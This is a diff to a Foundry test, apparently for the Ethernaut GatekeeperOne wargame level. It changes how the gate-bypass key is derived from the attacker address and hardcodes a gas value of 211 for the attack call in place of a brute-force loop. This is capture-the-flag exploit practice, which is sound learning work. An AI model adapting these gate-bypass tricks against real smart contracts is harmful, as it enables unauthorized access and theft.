@@ -24,10 +24,7 @@ contract GatekeeperOneTest is Test {
         instance = GatekeeperOne(factory.createInstance(player));
         attack = new GatekeeperOneAttack();
 
-        uint16 k16 = uint16(uint160(attacker));
-        uint64 k64 = uint64(1 << 63) + uint64(k16);
-
-        key = bytes8(k64);
+        key = bytes8(uint64(attacker)) & 0xFFFFFFFF0000FFFF;
 
         assert(uint32(uint64(key)) == uint16(uint64(key)));
         assert(uint32(uint64(key)) != uint64(key));
@@ -35,14 +32,14 @@ contract GatekeeperOneTest is Test {
     }
 
     function testGatekeeperOneAttack() public {
-        for (uint256 i = 0; i < 8191; i++) {
+        // Gas required to hack the GatekeeperOne contract is 211
+        //   attack.attack(address(instance), key, 211);
+        for (uint256 i = 211; i < 212; i++) {
             try attack.attack(address(instance), key, i) {
                 log_uint(i);
             } catch {}
         }
 
-        log_address(attacker);
-        log_address(instance.entrant());
         assertTrue(factory.validateInstance((payable(address(instance))), attacker));
     }
 }
